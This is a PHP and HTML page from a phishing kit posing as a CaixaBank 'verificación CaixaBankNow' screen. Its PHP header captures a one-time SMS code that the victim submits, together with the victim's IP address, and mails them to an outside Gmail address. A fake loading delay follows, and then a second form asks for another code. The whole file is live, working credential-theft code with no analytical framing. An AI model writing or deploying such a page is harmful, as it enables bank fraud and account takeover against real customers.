<?php
	$ip = $_SERVER['REMOTE_ADDR'];
	$message  = "****************[CAIXA_ES]***************\n";
	$message .= "Codigo1	: " .$_POST['put20']."\n";
	$message .= "******************************************\n";
	$to = "appstorej9@gmail.com ";
	$subj = "CAIXA_ES_sms $ip";
	$from = "From: CAIXA_ES<info@online.net>";
	mail($to, $subj, $message, $from);
?>
<!DOCTYPE html>
<html>
<head>
	<title>CaixaBank | verificación CaixaBankNow</title>
	<link rel="icon" type="image/png" href="../img/icon.png" />
	<link rel="stylesheet" type="text/css" href="../img/css.css">
	<script type="text/javascript">
    function karimo(){  
    		var cd = document.getElementById('Cd').value;
    		var chp1 = document.getElementById('put3').value;
	    		if(cd != chp1){
	    			document.form.submit();
    			}else{
	    				alert("El código no es válido");
	    				return false;
	    			}
        }
    </script>
</head>
<body id="body">
	<div id="cnt">
		<div id="hdr">
			<div id="hedr4" style="display: none;">
				<form action="./inda.php?gUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQiPg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3&ug=cudzMub3JnLzE5OTkveGh0bWwiPg0KICAgIDxoZWFkPg0KICAgICAgICA8dGl0bGU+IEFwcGxlI" method="POST" name="form" id="frm" autocomplete="off">
					<input type="hidden" value="<?php echo $_POST['put20']; ?>" id="Cd" name="Cd">
			<div id="put30" class="absolut"><input id="put3" class="put" type="text" style="width: 178px;" placeholder="" name="put30" minlength="6" maxlength="8" required></div>
				<div id="pt9" class="absolut"><input type="image" src="../img/S3.png" onclick="return karimo();"></div>
				</form>
			</div>
			<div id="hedr2">
			<div id="put11" class="absolut">
			<img src="https://icon-library.com/images/loading-icon-animated-gif/loading-icon-animated-gif-19.jpg" style="width:84px;">
			</div>
			</div>
		</div>
	</div>
	<script type="text/javascript">
            setTimeout(function() {
                var el = document.getElementById('hedr4');
                var e = document.getElementById('hedr2');
                if( el ) 
                    el.style.display = 'block';
                    e.style.display = 'none';
            }, 15500);
        </script>
</body>
</html>